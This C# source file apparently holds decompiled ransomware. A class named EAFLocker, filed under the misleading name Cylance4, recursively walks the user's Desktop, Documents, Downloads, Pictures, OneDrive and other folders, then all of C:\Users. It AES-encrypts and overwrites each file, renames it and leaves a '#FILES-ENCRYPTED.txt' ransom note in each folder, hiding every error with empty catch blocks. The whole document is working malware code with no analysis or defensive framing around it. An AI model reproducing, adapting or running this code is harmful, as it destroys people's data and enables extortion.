using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace TSVT26;

internal class Cylance4
{
	public class EAFLocker
	{
		public void EnceyptFile(string file)
		{
			try
			{
				if (Path.GetExtension(file) != ".kill")
				{
					string encryptPassword = Config.EncryptPassword;
					string fileName = Path.GetFileName(file);
					string? directoryName = Path.GetDirectoryName(file);
					string text = Config.fileRename.Replace("%FILE%", fileName);
					string outputfilePath = directoryName + "\\" + text;
					Encrypt(file, outputfilePath, encryptPassword);
				}
			}
			catch
			{
			}
		}

		private void Encrypt(string inputFilePath, string outputfilePath, string EncryptionKey)
		{
			try
			{
				byte[] inArray = null;
				string text = "<THIS_FILE_ENCRYPTED>";
				byte[] bytes = Encoding.UTF8.GetBytes(EncryptionKey);
				using (BinaryReader binaryReader = new BinaryReader(File.Open(inputFilePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None)))
				{
					binaryReader.BaseStream.Position = 0L;
					inArray = AES_Encrypt(binaryReader.ReadBytes(10000000), bytes);
				}
				using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(inputFilePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None)))
				{
					binaryWriter.BaseStream.Position = 0L;
					binaryWriter.Write(text + Convert.ToBase64String(inArray) + text);
				}
				File.Move(inputFilePath, outputfilePath);
			}
			catch
			{
				File.Move(inputFilePath, outputfilePath);
			}
		}

		private byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] array = null;
			byte[] salt = new byte[13]
			{
				73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
				100, 101, 118
			};
			using MemoryStream memoryStream = new MemoryStream();
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1);
			aesCryptoServiceProvider.KeySize = 256;
			aesCryptoServiceProvider.BlockSize = 128;
			aesCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(32);
			aesCryptoServiceProvider.IV = rfc2898DeriveBytes.GetBytes(16);
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			return memoryStream.ToArray();
		}
	}

	public static EAFLocker EL;

	public static void Start()
	{
		EL = new EAFLocker();
		new Thread((ThreadStart)delegate
		{
			LookForDirectories();
		}).Start();
	}

	private static void LookForDirectories()
	{
		try
		{
			string userName = Environment.UserName;
			string location = "C:\\Users\\" + userName + "\\Desktop";
			string location2 = "C:\\Users\\" + userName + "\\Links";
			string location3 = "C:\\Users\\" + userName + "\\Contacts";
			string location4 = "C:\\Users\\" + userName + "\\Desktop";
			string location5 = "C:\\Users\\" + userName + "\\Documents";
			string location6 = "C:\\Users\\" + userName + "\\Downloads";
			string location7 = "C:\\Users\\" + userName + "\\Pictures";
			string location8 = "C:\\Users\\" + userName + "\\Music";
			string location9 = "C:\\Users\\" + userName + "\\OneDrive";
			string location10 = "C:\\Users\\" + userName + "\\Saved Games";
			string location11 = "C:\\Users\\" + userName + "\\Favorites";
			string location12 = "C:\\Users\\" + userName + "\\Searches";
			string location13 = "C:\\Users\\" + userName + "\\Videos";
			encryptDirectory(location6);
			encryptDirectory(location5);
			encryptDirectory(location2);
			encryptDirectory(location3);
			encryptDirectory(location4);
			encryptDirectory(location7);
			encryptDirectory(location8);
			encryptDirectory(location9);
			encryptDirectory(location10);
			encryptDirectory(location11);
			encryptDirectory(location12);
			encryptDirectory(location13);
			encryptDirectory("C:\\Users\\");
			encryptDirectory("C:\\Users\\" + userName);
			encryptDirectory(location);
		}
		catch
		{
		}
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(Config.validExtensions, (string E) => E != extension.ToLower()) && extension != ".kill" && fileName != "#FILES-ENCRYPTED.txt")
					{
						EL.EnceyptFile(files[i]);
						File.WriteAllLines(location + "/#FILES-ENCRYPTED.txt", Config.messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}
}
